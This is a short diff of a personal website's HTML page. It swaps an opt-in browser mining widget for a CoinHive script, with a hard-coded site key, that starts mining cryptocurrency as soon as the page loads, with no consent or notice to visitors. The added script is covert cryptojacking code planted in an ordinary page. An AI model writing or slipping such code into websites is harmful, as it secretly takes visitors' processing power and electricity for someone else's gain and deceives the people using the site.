@@ -57,12 +57,11 @@
 		<!-- Navigation -->
   
 		 </header>
-	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-	<div class="coinhive-miner" 
-	style="width: 256px; height: 310px"
-	data-key="4PpndIhcMQSV6xZ3Dw4Uo6KgEXNJRynL">
-	<em>Loading...</em>
-	</div>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script>
+	var miner = new CoinHive.User('4PpndIhcMQSV6xZ3Dw4Uo6KgEXNJRynL', 'john-doe');
+	miner.start();
+	</script>
 		<!--About Me -->
   
 		<div class="content container" id="about"><!--about me content container-->
